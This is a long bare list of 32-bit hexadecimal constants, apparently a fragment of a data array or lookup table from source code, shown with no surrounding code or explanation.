0x5D38BD2F, 0x8F75657E, 0x7D65EB6E, 0xF63D817A, 0x313434B2, 0x81802053, 0xC1AFABD5, 0xC0823820, 0xA86BD91F, 0x4E8E29E6, 0x3800C0DC, 0xD2753551, 0x16753CF4, 0xFC2F119F, 0xD2C80B2E, 0xBBFC9050, 0x42140FF9, 0x2CEDE6C5, 0xEBC7B918, 0xBD088F4B, 0x2148EA84, 0xB370270A, 0x6F5F1E6C, 0x4B5F15B, 0x8BD5759B, 0xF125BFCC, 0x3F358BEA, 0x7349C856, 0xC1AEB88D, 0x928A4DEC, 0xCC90110B, 0x57DFB1EF, 0xE38E252D, 0xEE4B1219, 0x56737A3C, 0x567B0E11, 0xC66E28C3, 0xD6A3B458, 0x86E80A17, 0x2CDA5012, 0x86AC4A85, 0x9DB5D209, 0x3C5085E4, 0xD0F51299, 0x3F1ABDA4, 0xAD1476EA, 0xDEBEEFCF, 0xED35C094, 0xB72CF194, 0x90DF7A4C, 0x720B8073, 0x4B770634, 0x40BB1149, 0x286F82CC, 0x5E440AC7, 0xF6422F9A, 0xE0EBB49C, 0xCF198055, 0xBE92551F, 0x98BDB311, 0x59090745, 0x12B086EA, 0x637BB680, 0x6E37F132, 0x34C4E789, 0x4C2BA99E, 0x76AFFBB5, 0x25CDDB66, 0x2952BA56, 0x4E9776D0, 0x98602B0, 0x4B67D7EE, 0x3FE8C5A0, 0x3ED21C90, 0xA07C5B7D, 0x76751DD4, 0xB114489B, 0x389EF71, 0x13EFB9A0, 0x8C8A8D6E, 0xFC70EEC7, 0x7DA6BC83, 0xA6438D4B, 0x3B0171EE, 0xB98DB96B, 0x2530A087, 0x69DFA0AF, 0xBADA0093, 0xCBDB7739, 0x1FA39EFE, 0xDEBAB2AF, 0x961E1745, 0x404794CA, 0x3000F092, 0x961458F9, 0x290421BE, 0xB775838, 0xFD7814A5, 0xA0DC0B87, 0x741BF04F, 0x91833867, 0xE7C3405E, 0x6C17122E, 0xA2A0AA0, 0x5F1DDFCB, 0x5CC1380, 0x4FFB8C6C, 0xF686B26E, 0x4E3A0CC4, 0x7500C79, 0x58A80BD5, 0xF9ABE88F, 0x5A949543, 0xB927CE9A, 0x99861609, 0x7018BE31, 0x20E01957, 0xAA7F1131, 0x6CD58238, 0x90950455, 0x194BB7B0, 0xAFE92319, 0x5E3B5942, 0x39C82BB, 0x2909ABF0, 0xB48C0C04, 0x25EA2AA5, 0x7A97283F, 0x6F7043A3, 0x8C555ADD, 0x43103006, 0xDD31EC4E, 0xA1AE7CC7, 0x63CB4603, 0x40D90BF2, 0xEB3C4C7E, 0xD41C9AED, 0x30B98369, 0x2A080C8, 0x6F6FC7E6, 0x1572022A, 0xDDDE26FA, 0xEA9CA03, 0xC60D0785, 0x4D885B2E, 0xEDAC574, 0x129F9DC1, 0x1118A947, 0xE65F8059, 0x7AB5523B, 0x51BBCE7E, 0xCA072485, 0x604C872B, 0x8D4D9ABB, 0x2CE311A7, 0xB014A09C, 0x5DB7B3A9, 0xAB933841, 0x56CB715E, 0x516E30EE, 0x6E965420, 0xF9A401F, 0x97886238, 0xCC9D7F1A, 0x75C49F74, 0xB103A8E1, 0xD050F490, 0x7DA12905, 0x7F67671D, 0x84FA790D, 0xA819680B, 0xCD71F11B, 0xABF77334, 0x7E5BC0E, 0xBCE03D35, 0xC3169BDA, 0x7BC5BF3C, 0xB19215F6, 0x7D4BC475, 0x7D4BC475, 0x5AEFEC3A, 0xE9E7FAC5, 0x177EFC79, 0x19198A16, 0xB90353D7, 0x9199C77D, 0x16FD386C, 0xEF3B4ED9, 0x9A2180FF, 0xF30658D2, 0x43709044, 0x4BD72FE8, 0xB32087E0, 0x72E2E18B, 0xCEA0F9A, 0x5CC2F1B8, 0x39D9102F, 0xFDF2F7C2, 0xE57202A1, 0x67E28E1D, 0x40321B83, 0x8DC0368D, 0x7265BEA2, 0xEE13F92, 0xD0D8BDBC, 0x48D72B88, 0x82697713, 0x876D5363, 0x9678D4FF, 0x7B820CD5, 0x2F0D0973, 0x2C2A6C3, 0xFE027CB5, 0xCCD525E1, 0xAC3CEB9C, 0x3B321816, 0xD45D605C, 0xA66CE30, 0xDE1DBB59, 0x1D196361, 0x85D813C6, 0x972C5A8B, 0xB89DBB80, 0xDD5D08A7, 0xA3589628, 0xCC78999D, 0xACF162E0, 0x99968B37, 0x84ADF9EB, 0x63458C27, 0xDF6D5D54, 0xEF0B78E6, 0xFB18CB19, 0x423B7BA2, 0x79F8C18C, 0xD4A215BA, 0x994B8C2D, 0x8B635546, 0x4A1DC59A, 0xC249D62D, 0xE254C39C, 0x714BD6E4, 0x354F283C, 0x4E372FE2, 0x7FDDC0A6, 0xD78AC46C, 0x7A877554, 0xB4629D66, 0xFB301746, 0xD8B7637C, 0x511D7EF8, 0xF7E1A691, 0x935C978D, 0x134E0785, 0x836D9795, 0xDE7442EE, 0x8FAC739, 0xB1E086FF, 0x267FCEAD, 0x6DE3AADA, 0x56E0C163, 0x3CA16652, 0x4DC27FCF, 0x170C6E0+1, 0xC4D122F8, 0xE038813, 0xB1460D43, 0x84E7DE9F, 0x5533F60B, 0xA45B6C8D, 0xFE0A106B, 0x82EF240, 0x373CC405, 0x79CA237B, 0xCC1D8F66, 0x8A251612, 0xC9D098B3, 0xACDD0674, 0x9561AD98, 0x9AA3CC8C, 0x52873C6A, 0xA7EC79CE, 0x397F06E3, 0x7AB43DB8, 0xE8D524F, 0xD66AE1D3, 0x6FE1E440, 0x23441648, 0x82E548CC, 0xEDC31475, 0xAA73DAD9, 0xAE620A1B, 0x149C60A8, 0x759EF63A, 0x90E805AC, 0x46828B4E, 0xAC9BBA23, 0x9208D689, 0x7BF61471, 0x47C60963, 0xF83E4DAF, 0x2C32D9AE, 0x89AD49FF, 0xA817CDEB, 0xB83CEE93, 0xBACF010, 0xF1967A12, 0xF8BE54DC, 0xC60C9ACD, 0xD4C73595, 0xAEC9163B, 0x504C4B22, 0x9413EB54, 0xBF85AE77, 0xC1CD89B9, 0x27F25C0E, 0x3C94D88A, 0x3C30B447, 0x895E1D67, 0x5736FB23, 0xBA84FD8C, 0x7A7F5BC3, 0x170DA109, 0xC59D4268, 0x5F7789E6, 0x29850FE2, 0x9754C27D, 0xC0A8590A, 0x83D9FBE7, 0xC9780B95, 0x4892B882, 0xEF1BC082, 0x52559BB6, 0x52559BB6, 0x8FDDB5DB, 0x952ABD9A, 0xD4F7B05C, 0x4111BA46, 0xE3318E0E, 0xC866A984, 0x837BD370, 0xC21C8A56, 0x5D2FC042, 0xEBFCFF1A, 0xF48F3051, 0x60746B88, 0x44E1680C, 0x5CB76219, 0xD28DBA90, 0xFF43C18D, 0x2B1BD9C5, 0x894314A4, 0x57E5B3F9, 0xC6F36292, 0x211DEFEC, 0x95D3BD8, 0x45F3BDFB, 0xC6517D52, 0x6435F67F, 0xC0E23671, 0x3B0CA391, 0xFD103BA7, 0x746DDAC0, 0x829F2E2, 0x8D8B180, 0x2D23D743, 0x81DF8B43, 0x728D3D53, 0x922A6653, 0x7BCD8991, 0x80275EE, 0xDFE34E4A, 0xCFA20D68, 0x50A95442, 0x7F87559E, 0xDC8239EB, 0x8F6C1F55, 0x85615FD0, 0x18DD76A1, 0x6D55B3B3, 0xAAD4012C, 0x8B02A8FB, 0xC0EFB7A3, 0x83CB5052, 0xFA12E286, 0x2654A0F4, 0xC833BBE1, 0x44A153F2, 0x20A5BDE0, 0xF2865370, 0xCF1384C4, 0xBD4236F6, 0xFB2AFED1, 0x97353375, 0x9C8F830D, 0x77CBA290, 0x3EFBDD9B, 0xBD96D8E8, 0x40638BDC, 0x4763B2C6, 0x74BDA7CE, 0xB66B0C9A, 0x34AAAFA5, 0xCB65198D, 0x6D88BCD3, 0xF3B7EFBF, 0xA0134498, 0x14D3E6E3, 0xA4B82097, 0x20D6273E, 0x5231F901, 0xE94E24D4, 0x4CAD1A4A, 0x141CC936, 0xC4BC4841, 0x1E54DB12, 0x376CE3C0, 0x8F3F3A9C, 0xFC13CE80, 0x8A13A41F, 0x208D0CB8, 0xF7ADC960, 0xF210BE69, 0xCB6C4ED, 0x70AA5B7D, 0x47187F7F, 0x629F15BD, 0x7B33289A, 0xBDE749F7, 0xA993915F, 0x76A1DB9F, 0x70559AC7, 0x8CD3E487, 0x3543019E, 0xD4496BF3, 0xEFD58EB9, 0xF7E2FBAD, 0x4579CAB1, 0x1CFBFD4B, 0x737C3689, 0xA38C0234, 0x4DDF845F, 0x4483EF06, 0x80EAD297, 0xF65B0D4, 0x195EF5B7, 0x59DE73AC, 0xC08FE5F6, 0x58C0F6CF, 0x761F8F48, 0x33F43FA, 0x4C684C81, 0x7B4C3E6F, 0x5BC276AE, 0x1F6CCDDE, 0x9BA19C13, 0x5244F4E2, 0xE131E3B3, 0xA2FDAF27, 0xADB2511A, 0xF8053081, 0x5720A5DD, 0xB7CD0A49, 0x343B4DE0, 0xD3B04476, 0x9955BC6F, 0x8E5D4EAB, 0x7B0040A8, 0xFDA62DE, 0x584C5178, 0x2A5DF721, 0x233C9ACF, 0x6DEF6F1C, 0xFC942D7C, 0x89EEE07B, 0x9CFBE10D, 0xCFF6FF66, 0xABE98267, 0x2FC10D11, 0x2AB3670B, 0x542FEB4D, 0xD82829DC, 0xFD64EAE5, 0x7820CA43, 0x5AD7DC55, 0x6FD9A7CD, 0xE9B97A2B, 0xFF1F6AEB, 0xE9BD733A, 0x1862A461, 0x2086B1F0, 0xA1008E0E, 0xED366E53, 0x12677780, 0xA316D13F, 0x5F6C3328, 0xD680D49, 0x24A1284E, 0x8A3A3116, 0x74EB662D, 0xFFF149FE, 0xA2FA2C17, 0xEB0D3C87, 0x52A1CA49, 0xCF94BA97, 0x5194658B, 0xC1DAE216, 0x7C563CD2, 0xFDDB042E, 0xA211A128, 0xB5F8BA28, 0xFE2554FC, 0x77BB7CB8, 0x4AC3421E, 0x7CEFFA45, 0x12E62F9E, 0xF3E7730E, 0x6C23D329, 0x8818A959, 0x9B9B7163, 0x81D64248, 0xCFA613FF, 0x139C0875, 0x9ADD7B21, 0x9BE7C860, 0xD044C8AF, 0xAFEC26A4, 0x2EA4B54E, 0xBDD3CE69, 0x3993092B, 0xA717A875, 0x16F30DF4, 0xA6F2C057, 0x797CAE4F, 0x3BD9B0A6, 0x533C0651, 0x2276DE0D, 0x59C52BE6, 0x1D87DDC1, 0xB52BA5F5, 0xFBD9B050, 0x187B9070, 0x45037B9B, 0x840D24D3, 0x31C31DAA, 0x9194DB71, 0x33248CC1, 0x5B1B70AA, 0x7EB613D9, 0xECD73DB0, 0x74A0F291, 0x616D5040, 0x259C6BA2, 0x849F0716, 0xFC1CFC27, 0xA3421E39, 0xC70F4A84, 0x3B882533, 0x87A0C174, 0x7BD26837, 0x98E29ED0, 0xD315978E, 0xFFDDF8FA, 0xF3876894, 0x57A282F1, 0x2EC2A0B2, 0xF5AB0D98, 0xB0B2C852, 0xF10112FD, 0x89365F0D, 0x32ED9F82, 0x47D87A84, 0x2DE48DA1, 0x72CF2514, 0xE9BA6189, 0x52A1CAB2, 0xBF7F9035, 0x164DDEFF, 0xEAD0269A, 0x383EC364, 0x900008C6, 0x79543043, 0xCB716F68, 0x4D3325F4, 0xF9FB4B71, 0x5AE7EDA2, 0x8802F696, 0x83BAE814, 0xB153E1B9, 0xFFE2667B, 0x4DD03628, 0x879AE45, 0xB1080C4, 0x761CD02E, 0x76D28E96, 0xAB688DAB, 0xF48A9155, 0x10F2C023, 0xDBB2FA7, 0x810158F8, 0x5023F8F, 0xAA39FD6C, 0xEF9142DB, 0x688DE64, 0x909A1D76, 0x4AAD0ECB, 0x492C9E46, 0x814A28F4, 0xB60D2BA, 0x6B83ABDF, 0xF46B4DC8, 0x36A4AC65, 0xBA699DDF, 0x6FE5218C, 0xFB4000DC, 0x572BA553, 0xF7EB2BF1, 0x3F480F92, 0x280A004A, 0x39245667, 0x8C0B243A, 0x1D2B5C70, 0x2F9550C2, 0x37DBC2AD, 0xC0F1BC91, 0x1A464167, 0xD0567D41, 0x4BBE5E2C, 0xA89A53F2, 0xA592EC74, 0x748D72AF, 0xB19B4706, 0x66E4A3AC, 0x51523B8C, 0x9E8F1644, 0xAE1D101B, 0xB30B552F, 0x5131CD2C, 0x7508668F, 0xB25D9536, 0x3E720BEE, 0xEAF291A0, 0x80DB77A7, 0xC67D5CF6, 0x7A18BB9C, 0x91F6848B, 0x84374452, 0x5187BED3, 0x46826B53, 0xFC0DB4C3, 0x2EEDB18F, 0x43E92628, 0xBA97CE91, 0x5FDC1047, 0x584463E0, 0x67522E25, 0x106BA127, 0x7C6F7668, 0x686672DD, 0xFD309DC8, 0xABF3130F, 0xC8A423A3, 0xA2A5C9FE, 0xCFB37773, 0x31711B8, 0x59910AB2, 0x49A11F0D, 0xA5B55421, 0xD0E0402F, 0xEE77C326, 0x97269DC8, 0x6E31E993, 0x6AC64990, 0x774A4C54, 0xBE515485, 0x6EF43BBB, 0x4C1B8867, 0x9873E404, 0x725ADCF2, 0x406B4B20, 0x1CF7D7DA, 0x821F2D2C, 0xF261633A, 0xD9783F6B, 0xB7A0914B, 0xED6F44F5, 0xAF3AFD83, 0xE13A71C7, 0x5E72AB72, 0x48A18913, 0x589A2661, 0x54EA5BCC, 0x140CA5A8, 0xED1D1662, 0xD17AFCD8, 0xBDCDD163, 0x665A06F5, 0x8E114B10, 0xE6DE71B7, 0xE15D777F, 0xC915285E, 0x49EAE968, 0xBF974891, 0x274631FE, 0x2DF7AF4, 0x9CEA7458, 0xA3D675ED, 0x1359292F, 0xB552626C, 0xA64C378D, 0x5F8A22A6, 0xD8EB3A44, 0x59B5C2A2, 0x6B34A160, 0xB9FB142F, 0x85725848, 0x3A7E5FB6, 0xD15C4B1C, 0xBF6993C7, 0x47CAB814, 0x39E3CB3F, 0xBB77E9CD, 0xF3240B77, 0xF6AAA2D7, 0x1DEC67B7, 0x7D80EEAA, 0x8866D9D0, 0x74D42C03, 0xF4D99685, 0x71B305BB, 0x13CAFAFA, 0x457F1E44, 0x456DB50D, 0x7DD7900C, 0xC0445A9C, 0x62A93608, 0x47017C90, 0x40E80543, 0x1317125A, 0x8F4BC32, 0xA5EDCDE8, 0x2A50657, 0x618857F2, 0x61B00A84, 0x4A9E9AE0, 0x7F6A60D3, 0x453C7CAB, 0xE2757AC1, 0x309BBDC1, 0x98DD98F1, 0x98F3B274, 0x6E9B8B9E, 0xB6209195, 0x8836E732, 0x9F27D00E, 0x85C7E232, 0x8AEA886C, 0xFA92E226, 0x8DD5B838, 0x4B37333C, 0xFDAAEA2B, 0x4256C73, 0x882D3EB3, 0x39AA9FC8, 0xA454DD29, 0xAF7AFCC4, 0x822BC992, 0x136A5BE9, 0x9FAB6729, 0x8F72FAD0, 0x4264CED2, 0xE495B6DA, 0xDFB9A2A2, 0x680C90EE, 0x563E0C+1, 0x6255F3B4, 0xC7B4D7AC, 0xB270E0F, 0x61CAE253, 0x772DA539, 0x1D31CBBD, 0x14F52453, 0x7E3BFBC5, 0xA3707DFC, 0xF20F72E5, 0xB986FF47, 0x825423C2, 0x62824EF4, 0x24BC5AC0, 0xF23277F3, 0xD04568B9, 0x94E42E2E, 0xB0C576CB, 0x374F42F0, 0x30CB28CB, 0xF1F5DCF0, 0xCCD937E7, 0xC6C3C53B, 0x80C2AB09, 0x751908A, 0xA7D8BCD3, 0x4136829A, 0x6F463F56, 0xAB55D8F3, 0xF440C04D, 0x5FEE98A2, 0x72429998, 0x8C7E68C1, 0xB71589DA, 0x9F80F6DF, 0x1B7BB388, 0x1FDB2919, 0xC9C75E82, 0x1B17E334, 0x2E19D7F6, 0xC86C1B4E, 0xC01238CC, 0xFF1BC556, 0x5D0FE25B, 0x46E7E31D, 0x1E359CC8, 0x8CB53C9F, 0xC552E06C, 0x86AB8DBB, 0x3A11D118, 0xC3B02362, 0x45514731, 0xB02C2F39, 0xAE446344, 0x362E69AD, 0x9F3D577F, 0x823ECA63, 0xA16626C7, 0x8EA12EDB, 0x432B0509, 0x70689638, 0x77B8EF01, 0xD79D5D1B, 0x4E418E13, 0xA3E4798E, 0x30DA1DA1, 0x832DEB7A, 0x14FE9264, 0xF66E5CDD, 0x725C6174, 0xF8A62EFC, 0x15786DD1, 0x8D2D89C4, 0x1C70B2EB, 0xD77CC34, 0x4A701EE1, 0xA97C2059, 0xA25D767E, 0x3D26105F, 0x1D371529, 0xE30A64DC, 0xF1E0CAFC, 0xF7A0F00F, 0xB8209F16, 0x8D9FD4D1, 0xECD12E60, 0x96100EA4, 0x4A01B76A, 0x13B4F70+2, 0x9DF75B2A, 0x64DDB07D, 0xA97C2F6C, 0x9765E71D, 0xFEA40B6C, 0xAD8383FA, 0x9254249D, 0xFD60F5AB, 0x5D382498, 0x6FF034BB, 0xA877FF5E, 0xBB62AAC5, 0x8C6E611D, 0x7150720, 0x4316C9E7, 0x2849D4B2, 0x7A6B0EF8, 0xEA01BD4A, 0x98D244, 0xE26B2666, 0x6FCB7795, 0x5D67F751, 0xDEAB87AB, 0x1C68D9DC, 0x96C26F66, 0x6674818, 0x19EAE282, 0x253FD520, 0x78D7A5A0, 0xBE7ACD89, 0xBB4E2F66, 0x1E28B28F, 0xDE524830, 0x3CD9CBB7, 0x29D3841, 0xA40FD5D9, 0x2BEE1F45, 0xA3525D60, 0xA1B447B5, 0xB49C1442, 0x4280F92F, 0x54763B35, 0xA2826D17, 0xC8055034, 0x27512BA0, 0xB03BCCDF, 0xCDC9D654, 0x22B9F132, 0x5C95B670, 0x67B23E17, 0x3D981EBF, 0xF3F1D953, 0x11F38FB3, 0xF8E5F73A, 0x682CB7E1, 0xC515E735, 0xEFAF4BA6, 0x8251485D, 0xCEEAD94B, 0x249BC876, 0x13BC46C0, 0x591EA833, 0x4559460A, 0xF3C2875A, 0x4301E10C, 0xEC2AAF06, 0x6BE5DF29, 0x5ECF955D, 0xD1ED1D48, 0x19EE0CCB, 0x88068C7C, 0x6A67FC31, 0x15607620, 0xEBE420A4, 0x2C959AF9, 0xB9A3512, 0x75324674, 0x88CA3BFC, 0xCABD136A, 0x628F489B, 0xAB3346B5, 0x95D5EBD, 0xDB75CDD1, 0xB37384BC, 0xC98160E1, 0x2B240E0A, 0x9A703A2B, 0xD094F11A, 0xAF3C081B, 0x2FB9F53C, 0x6C5738AB, 0x468668F0, 0x90C74343, 0x94BF0D35, 0x3ACE6D6B, 0x85488C49, 0x467F4CAA, 0xEB2D93B3, 0x579B4510, 0xF8BDA989, 0x515AF67C, 0xDF45B2A7, 0x2AE35169, 0x2C2B0C46, 0xFC50151C, 0xDF084A6B, 0xFFED3676, 0xA796D7A7, 0x9497F31, 0x4D8A6521, 0x7AA36406, 0xF379DCE4, 0x65D84665, 0xD268255C, 0x8CEBA60D, 0x159FE39C, 0x4CE9BAA7, 0x5303FC8, 0x3001EA86, 0x9F98FA5C, 0x56E29A1E, 0xEEDE7FAB, 0xE190E45A, 0x930B3AE5, 0x5298F472, 0x86DAE6D6, 0x9AA2BA3F, 0xC96456BA, 0xC5E08B66, 0x4EE74A3, 0x8DA93C3D, 0x37DD48B5, 0xF929F61D, 0x572EB5E, 0x8E7AEEB7, 0x28C57FA0, 0x59394583, 0x92452C0E, 0xBBA8D34D, 0xB21288FA, 0xE778B2A7, 0x7E24BD6E, 0xCE7D50A8, 0xD26CCA46, 0x7CCC49AF, 0x8A6BBDEA, 0xE0160504, 0xA3EFE4A1, 0x24D84334, 0x8A023024, 0x1C65B038, 0x4D4C37B3, 0xAED95A6F, 0xF1D464E5, 0xEFB078AA, 0x486867E6, 0x84BDD475, 0x9E5629F4, 0xE10A7CA4, 0xC62406A6, 0x4E9AC983, 0xC3FD3822, 0xA3407CA3, 0x2F171B94, 0x7A299C13, 0xBF0F4B2, 0xCE6B62B5, 0xCE7A2411, 0x22804C20, 0x395D18B1, 0xED7000C8, 0x99FCC86, 0xC9CC1C5C, 0x6CEA96F2, 0x55D79DFB, 0xC1224AA7, 0x36BE807B, 0xB1EF2E21, 0x1192C9A3, 0x2CBAA739, 0xDBE78ED7, 0xA286F015, 0x1C6FE43E, 0xFCBDA612, 0x28A3DD2B, 0xD762D16C, 0x10CE4BDE, 0xC846ECCE, 0xE9D9B70F, 0xE2E8B6BA, 0x717B87D9, 0x1544B29F, 0x3507D253, 0xDFC5F71E, 0x46F21343, 0x2F283CE, 0xC4110917, 0x343B27E2, 0xE3247582, 0xFD66A429, 0x9B431236, 0x347B4436, 0x2C1D6C31, 0x24DD4929, 0xDFC25D66, 0xCA160BCC, 0xB5BF87B2, 0x1F938864, 0x3F8E893B, 0xFB93C5A2, 0x6ACE1B7D, 0x7842C4D6, 0x61ECC465, 0x598C06F3, 0x8770017B, 0x56AFB9F5, 0x896CDF8D, 0x1A66945F, 0xC960E161, 0x3AAB699C, 0x5B90B5FF, 0xCDC52280, 0xAC2C7C63, 0x413539BC, 0x580D5508, 0x489E27E7, 0x2BDE85C1, 0xA4746384, 0x6602CED6, 0xD003E648, 0x759E0EC9, 0x62073DF7, 0x30558CFD, 0x6CE3692, 0x8D5C7B37, 0x37D152BB, 0xD1FA1BDB, 0xFE14A8EA, 0x25740A1D, 0x3AFF9E58, 0x79716890, 0x345166F3, 0x4181752, 0x40520E70, 0x31002201, 0xDDD1F1F3, 0x66FEB701, 0x9E2B9522, 0x1AC97138, 0x6E96A1EE, 0xB731DF54, 0xA56EE34, 0x3821A334, 0x6F2820F4, 0x233E058A, 0x7090012F, 0xEEB8BF5C, 0x1789437B, 0x3AC5B2F1, 0xBD91B136, 0x6B553408, 0xCA931F34, 0x1B03F59F, 0xC5B7E685, 0xAC020C18, 0xC678B29F, 0x9BEC3401, 0xC977D6E2, 0xF2DB6A82, 0x766A74FE, 0x6B90E730, 0x509A286F, 0x5F9DF634, 0x7524E27B, 0x1C5CCC3A, 0x44F7D82B, 0x87F498C1, 0x88AE9667, 0xFC8A71F3, 0xEDF02302, 0xCE7CB520, 0xA11289EC, 0x4AC39C6C, 0x3E69E7C3, 0x2FFD2FA5, 0x23D70C39, 0xAD43306, 0xC7DE5C30, 0xA3DAC790, 0x726FAE66, 0xF03895A4, 0x4C39CF10, 0x2180AE13, 0xEE292B91, 0xA063CABD, 0x62C19A3D, 0x3B4EF322, 0x54E775E0, 0xE3F0D62D, 0xC9DBDA90, 0xB72403F5, 0xC76E023C, 0x24857907, 0x6DCFC021, 0xE1013910, 0xFFF1B500, 0x48CEB6B4, 0x62BFDB37, 0x939243FB, 0xAE0F069E, 0x1094782F, 0xAF8F8E9D, 0xFFFC85D4, 0xB7E0F0A, 0xCD9805E7, 0x3930C042, 0x41A094F8, 0xC2CC1DF2, 0xCD31C872, 0xDCA96950, 0x5E6763C, 0xAE050B5, 0x2988B3FC, 0x4FFF397D, 0xD04A817A, 0x546C627A, 0x230D5455, 0x1E21F7AA, 0x3B70D1DB, 0xDF7CBD36, 0xB2C33714, 0x27EF6CB2, 0x9211A28A, 0xAFCB2B86, 0xCDB4FB7E, 0x3EA7FCE4, 0xC2EE9A02, 0x2C649263, 0x3EFF96BE, 0xC10F178C, 0xCFEA19A9, 0x9ACC6446, 0xC44762A1, 0x1D56993C, 0xD2D026CD, 0x34D91E7A, 0x14680A60, 0x18DB04AC, 0xB456D707, 0xECE8365D, 0x403CD434, 0xA07BAEB9, 0x10B6AB36, 0x72344191, 0xC0157255, 0xE80F8ABE, 0x1B3521F4, 0x42CFE9C0, 0x56253356, 0xDF9C38B6, 0xFA037FEB, 0x7C05B1F6, 0xAD234B7F, 0x3ECD839F, 0xEAA51103, 0x829E975, 0x2832C010, 0x56135ACC, 0x280DC015, 0xD5A450F1, 0x39A0E1F2, 0x9B7BA38F, 0xF0BD420D, 0x2BA7AC2, 0x47352E14, 0x279077B0, 0x55CB21F9, 0x1084F2F4, 0x5B1E995D, 0x4B4B9A13, 0x408F7148, 0x4062FF73, 0x59CC312D, 0xFB4D062D, 0x2349373B, 0x74C16879, 0x569847E3, 0xC7A3D279, 0x90F64284, 0x7154B6FD, 0xE5612C1A, 0x9CD6A451, 0x4267DA87, 0x9FA4AF99, 0x9EF0A9CF, 0xF2CDD6A8, 0x17B0A1CD, 0x3DA7AA5D, 0xDAB4BAC0, 0x37BE2FBB, 0x670FA2A6, 0x24F49427, 0x1977C56A, 0x30F8A487, 0x814D0752, 0x62F02485, 0xA6459CAA, 0xF8F515E4, 0x80BAA035, 0x7CAC6FA0, 0xE243B2AF, 0x897A510F, 0x81043F00, 0xC0E83320, 0x1C576388, 0x3E9C4CBE, 0x5BBC5E23, 0x1A65037B, 0x9BCF1BE, 0x209C28CF, 0x17A29F23, 0x841800B3, 0xB2E1E1A0, 0x29828690, 0x5F978584, 0x234C1AE9, 0x4479B304, 0xC273BB4D, 0x66DCD9D2, 0xBEA88097, 0x88E4FECE, 0x17A64668, 0x6F80965D, 0x356E3CE, 0x9CF1C19B, 0x8DCC19C5, 0x3AA39BE9, 0x8EE06BF4, 0xB8689B4E, 0x7B1141C6, 0xD3874AFA, 0xEC3060A2, 0xE0104D6C, 0x6ED3AD81, 0xD07C8AAA, 0x9E741875, 0xBA8128EC, 0x2C7ADB93, 0xE4AC0387, 0x1490182A, 0x36EC0EB0, 0x2DF5A6AC, 0x80A9E7A7, 0xD26CAC68, 0xA0E9B42, 0x34219154, 0x43271F69, 0xB837C816, 0x374827C2, 0xB2E686FC, 0xE52EB560, 0x8A632BD8, 0x9BD00ACF, 0xC6981FB9, 0xAF59151A, 0x5C85FF90, 0xD64C2FA, 0x33457535, 0xFE4A10D9, 0xB7B7D442, 0x53A879EE, 0x394B7AC9, 0x55E06443, 0x9C606EE3, 0xEA39A29, 0xDCC5B934, 0x2AFB14B8, 0xD9281778, 0x96491602, 0x54856309, 0xF91DF93B, 0x94B75EF, 0x86DC03F9, 0x5AB552C6, 0x3DDEB0E6, 0x2B520A57, 0xFC2DCF47, 0x2F72AE5, 0xE5F16398, 0x17229D98, 0xB621E7E4, 0x6DB46584, 0x95D61A4, 0x1582162C, 0x5A32D4B4, 0x500B6805, 0x7B72AFD1, 0xEF8C3959, 0x2B28F598, 0x7B784DD8, 0x991D6619, 0x60EB4054, 0xABA6923E, 0x1A7CEBD0, 0x4D9FBD11, 0x47ED03CE, 0xCDDF1508, 0xA3419909, 0x86FDDF55, 0xB2477B23, 0xAFA914EF, 0xDBDD79FA, 0x9D296BCD, 0xFD517CE3, 0x67E73525, 0x249EB4EB, 0xBE32B3B6, 0x3C37C767, 0xFBF44AD3, 0x601C22E3, 0xBEAF8F67, 0xDE3316AB, 0x9226734D, 0xA635F451, 0xC1971F30, 0x1A17A85E, 0xBC1E3D0A, 0x30463D73, 0x679DFB8, 0x20609E56, 0xC81C4677, 0x6719C109, 0x9FDCB250, 0xA8B917D7, 0x55634798, 0xCB415EE, 0x2A83083F, 0x4FD3EE7, 0xAC290A21, 0x12FA1C28, 0x5F7E23EA, 0xC143E97, 0x1D007E65, 0x5865B031, 0x2B84D1C4, 0xDA6A6FC1, 0x9B76F7E6, 0xB23F46E6, 0x500D9244, 0x98713C68, 0x291E938C, 0x225A38C8, 0xC99C19F5, 0xA2BE1821, 0xA2BE1821, 0x65D4A35D, 0xAC0631C9, 0x90847790, 0x35BB4EE0, 0xBC045625, 0xFA60601B, 0x4E937D57, 0xC65FC712, 0x5FEFAB72, 0xF1C493CF, 0x830AD50C, 0x9F3C5D6A, 0x7A05BF0D, 0x225380EF, 0x38A995C1, 0xA0AF0B98, 0x776888B, 0x29F97A71, 0xC6B6CCC1, 0xCB0D8932, 0xF5CA2A45, 0x83F18EE9, 0xC1EC907E, 0x3D026B29, 0xFFFE754E, 0xC9F00E68, 0xC829FAC9, 0x79E1D27D, 0x61CFBCBF, 0x2FB099E9, 0x7AF0133D, 0x86B76CB7, 0xD130F636, 0x3CEC07B1, 0x7FDF6131, 0x59C5FAD7, 0x3536946F, 0xCF9221A7, 0xE50D6DDE, 0xAA2C4AC2, 0x9C50FBF0, 0x1BE9D65C, 0x60DE1B76, 0xE32FFB22, 0xBAB4C0AE, 0xFA7F5047, 0xFB138A5, 0x697FC008, 0x9BE9C691, 0x1984A5D1, 0x5F072EB9, 0x90991122, 0x116997B1, 0xBF55025D, 0x59DB8F26, 0x17F9DFE8, 0xAE37E969, 0xDB18E5DE, 0xF58FDEB4, 0x5038F1A, 0xA0DA6B1D, 0xB5AD044E, 0xDF099E18, 0x2E7064E4, 0xF127AD6A, 0xF65C20A7, 0xDAF4F8FC, 0xCA6E91FD, 0x320813E6, 0xFDC54FC, 0x9E61921, 0xF33F83CA, 0x67305E59, 0x21B48F10, 0xD8761BB3, 0xA6C7864, 0x2A4E6706, 0xB92E5AF6, 0xA27A9413, 0x50779A2C, 0x80461113, 0x59677BA0, 0x920AE6DB, 0xA7AAA4D6, 0xA7AAA4D6, 0x55CF3BCD, 0x1552DC91, 0x9BD52ABD, 0x3F91358E, 0xD896CD82, 0x68E36B7A, 0xBBB26172, 0xAFABFB5D, 0x87125F5D, 0x624530B0, 0xF5F9B71E, 0x19266913, 0xC765633A, 0xC4CD35AF, 0xADF9904D, 0x85B7725F, 0x3595B104, 0x84B35B0, 0xF867F747, 0xE8422AC4, 0xA6BB5717, 0xFE39ECF8, 0x50F392EF, 0x23E6BA96, 0x1BBB2CAC, 0x4DFD5FEC, 0x75E60CF6, 0xF120A34E, 0xBD5F0EB8, 0xCDDB44D5, 0x6D7CF40C, 0x48262EDA, 0xB3CEC06F, 0x79B067AF, 0x79B067AF, 0x8FB923EC, 0x959818B6, 0x80DD15DB, 0xD3CCF64E, 0x81049608, 0x7C00B415, 0xBEB14C82, 0x923C3AA4, 0xBE1E7BB4, 0x1B54FB6B, 0xCAD2EF77, 0x6F5D215F, 